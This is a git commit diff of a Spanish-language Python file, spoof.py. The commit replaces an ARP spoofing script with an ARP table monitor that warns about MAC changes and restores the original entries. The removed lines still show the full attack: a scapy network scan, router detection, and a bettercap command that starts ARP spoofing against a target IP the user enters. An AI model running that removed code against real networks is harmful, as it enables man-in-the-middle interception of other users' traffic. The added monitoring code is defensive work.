323fa6863b49b300f6407890bab96e47179320e7
D4ncg2510 <108159079+D4ncg2510@users.noreply.github.com>
2024-06-30 18:39:46 -0600

    Update spoof.py

--- spoof.py
+++ spoof.py
@@ -1,54 +1,43 @@
 import subprocess
-import scapy.all as scapy
+import time
 
-def escanear_red(rango_ip):
-    solicitud_arp = scapy.ARP(pdst=rango_ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    solicitud_broadcast_arp = broadcast/solicitud_arp
-    lista_contestados = scapy.srp(solicitud_broadcast_arp, timeout=1, verbose=False)[0]
+def obtener_tabla_arp():
+    tabla_arp = {}
+    resultado = subprocess.check_output(["arp", "-n"]).decode()
+    lineas = resultado.split("\n")
+    for linea in lineas[1:]:
+        if linea:
+            partes = linea.split()
+            ip = partes[0]
+            mac = partes[2]
+            tabla_arp[ip] = mac
+    return tabla_arp
 
-    dispositivos = []
-    for elemento in lista_contestados:
-        info_dispositivo = {"ip": elemento[1].psrc, "mac": elemento[1].hwsrc}
-        dispositivos.append(info_dispositivo)
+def restablecer_arp(ip, mac):
+    print(f"Restableciendo IP {ip} a MAC {mac}")
+    subprocess.call(["arp", "-s", ip, mac])
 
-    return dispositivos
-
-def obtener_info_router(dispositivos):
-    for dispositivo in dispositivos:
-        if dispositivo['ip'].endswith('.1'):
-            return dispositivo['ip'], dispositivo['mac']
-    return None, None
-
-def mostrar_dispositivos(dispositivos):
-    print("Dispositivos en la red:")
-    for idx, dispositivo in enumerate(dispositivos):
-        print(f"{idx + 1}. IP: {dispositivo['ip']}, MAC: {dispositivo['mac']}")
-
-def arp_spoofing(ip_router, ip_objetivo):
-    subprocess.call(["bettercap", "-eval", f"set arp.spoof.targets {ip_objetivo}; set arp.spoof.gateway {ip_router}; arp.spoof on"])
+def monitorizar_tabla_arp(tabla_arp_original):
+    while True:
+        tabla_arp_actual = obtener_tabla_arp()
+        for ip, mac in tabla_arp_actual.items():
+            if ip in tabla_arp_original and tabla_arp_original[ip] != mac:
+                print(f"¡Advertencia! La IP {ip} ha sido vulnerada. MAC actual: {mac}, MAC original: {tabla_arp_original[ip]}")
+                restablecer_arp(ip, tabla_arp_original[ip])
+            else:
+                print(f"Verificación correcta para IP {ip}: MAC {mac}")
+        time.sleep(10)  # Espera 10 segundos antes de volver a comprobar
 
 def main():
-    rango_ip = "192.168.64.0/24"  # Rango de IP específico
-    dispositivos_encontrados = escanear_red(rango_ip)
-
-    if dispositivos_encontrados:
-        mostrar_dispositivos(dispositivos_encontrados)
-        ip_router, mac_router = obtener_info_router(dispositivos_encontrados)
-        
-        if ip_router:
-            print(f"IP del Router detectada automáticamente: {ip_router}")
-        else:
-            ip_router = input("Ingresa la IP de la puerta de enlace (router): ")
-
-        ip_objetivo = input("Ingresa la IP del dispositivo objetivo: ")
-
-        if ip_router and ip_objetivo:
-            arp_spoofing(ip_router, ip_objetivo)
-        else:
-            print("IPs no válidas.")
-    else:
-        print("No se encontraron dispositivos en la red.")
+    print("Obteniendo tabla ARP original...")
+    tabla_arp_original = obtener_tabla_arp()
+    print("Tabla ARP original obtenida:")
+    print(tabla_arp_original)
+    
+    try:
+        monitorizar_tabla_arp(tabla_arp_original)
+    except KeyboardInterrupt:
+        print("Deteniendo el monitor de la tabla ARP")
 
 if __name__ == "__main__":
     main()
